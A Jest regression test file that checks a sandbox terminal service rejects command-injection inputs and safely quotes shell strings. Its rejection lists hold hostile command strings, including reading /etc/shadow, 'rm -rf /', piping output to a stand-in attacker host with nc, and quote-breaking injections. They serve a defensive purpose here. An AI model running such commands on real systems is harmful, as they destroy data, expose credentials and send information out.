/**
 * Terminal Service — SEC-01 regression tests
 *
 * Verifies that command-injection vectors against the sandbox tmux wrapper
 * (see services/sandbox/terminalService.js) are rejected before they reach
 * docker exec, and that the defense-in-depth shell-quoting helper never
 * emits an unquoted single-quote.
 */

jest.mock('../../src/database', () => ({
  query: jest.fn().mockResolvedValue({ rows: [{ id: 'session-1' }] }),
}));

jest.mock('../../src/services/core/docker', () => ({
  docker: { getContainer: jest.fn() },
}));

jest.mock('../../src/services/sandbox/sandboxService', () => ({
  getProject: jest.fn(),
}));

const terminalService = require('../../src/services/sandbox/terminalService');
const sandboxService = require('../../src/services/sandbox/sandboxService');
const { ALLOWED_SESSION_TYPES, CUSTOM_COMMAND_RE, shellSingleQuote } =
  terminalService._internals;

const mockWs = () => ({ readyState: 1, send: jest.fn(), on: jest.fn(), close: jest.fn() });

describe('terminalService — input validation', () => {
  describe('sessionType allowlist', () => {
    const allowed = ['shell', 'custom', 'claude-code', 'codex'];
    allowed.forEach(t => {
      test(`accepts "${t}"`, () => {
        expect(ALLOWED_SESSION_TYPES.has(t)).toBe(true);
      });
    });

    const rejected = [
      'bash',
      'sh',
      'CUSTOM',
      'shell; whoami',
      'shell\nwhoami',
      '',
      '__proto__',
    ];
    rejected.forEach(t => {
      test(`rejects "${t}"`, () => {
        expect(ALLOWED_SESSION_TYPES.has(t)).toBe(false);
      });
    });
  });

  describe('CUSTOM_COMMAND_RE', () => {
    const ok = ['claude', 'bash -l', 'python3', './run.sh', '/usr/bin/env'];
    ok.forEach(c => {
      test(`accepts ${JSON.stringify(c)}`, () => {
        expect(CUSTOM_COMMAND_RE.test(c)).toBe(true);
      });
    });

    const bad = [
      "sh'; whoami; #",
      'ls; cat /etc/shadow',
      'ls && rm -rf /',
      'ls | nc attacker 4444',
      '`whoami`',
      '$(whoami)',
      'bash\nwhoami',
      'sh\twhoami',
      'ls > /tmp/x',
      '"; whoami; "',
      'a'.repeat(201),
    ];
    bad.forEach(c => {
      test(`rejects ${JSON.stringify(c)}`, () => {
        expect(CUSTOM_COMMAND_RE.test(c)).toBe(false);
      });
    });
  });

  describe('shellSingleQuote', () => {
    test('wraps plain strings in single quotes', () => {
      expect(shellSingleQuote('claude')).toBe("'claude'");
    });

    test("escapes embedded single quotes as '\\''", () => {
      expect(shellSingleQuote("it's")).toBe("'it'\\''s'");
    });

    test('neutralises injection payloads by quoting', () => {
      const payload = "sh'; whoami; #";
      const quoted = shellSingleQuote(payload);
      expect(quoted.startsWith("'")).toBe(true);
      expect(quoted.endsWith("'")).toBe(true);
      // No bare `;` that would terminate a shell command outside of quotes
      const unquoted = quoted.slice(1, -1);
      // After unwrapping, all internal single quotes must appear as escaped sequence.
      expect(unquoted.replace(/'\\''/g, '')).not.toMatch(/'/);
    });
  });

  describe('createSession — rejects injection payloads', () => {
    beforeEach(() => {
      sandboxService.getProject.mockResolvedValue({
        container_status: 'running',
        container_id: 'c1',
      });
    });

    test('rejects unknown sessionType', async () => {
      await expect(
        terminalService.createSession('p1', mockWs(), {
          sessionType: 'bash',
          userId: 1,
        })
      ).rejects.toThrow(/Ungültiger sessionType/);
      // Must fail before touching project lookup
      expect(sandboxService.getProject).not.toHaveBeenCalled();
    });

    test('rejects custom command with shell metacharacters', async () => {
      await expect(
        terminalService.createSession('p1', mockWs(), {
          sessionType: 'custom',
          command: "sh'; whoami; #",
          userId: 1,
        })
      ).rejects.toThrow(/Ungültiger command/);
      expect(sandboxService.getProject).not.toHaveBeenCalled();
    });

    test('rejects custom command with newline', async () => {
      await expect(
        terminalService.createSession('p1', mockWs(), {
          sessionType: 'custom',
          command: 'ls\nwhoami',
          userId: 1,
        })
      ).rejects.toThrow(/Ungültiger command/);
    });

    test('rejects custom sessionType without command', async () => {
      await expect(
        terminalService.createSession('p1', mockWs(), {
          sessionType: 'custom',
          userId: 1,
        })
      ).rejects.toThrow(/Ungültiger command/);
    });
  });
});
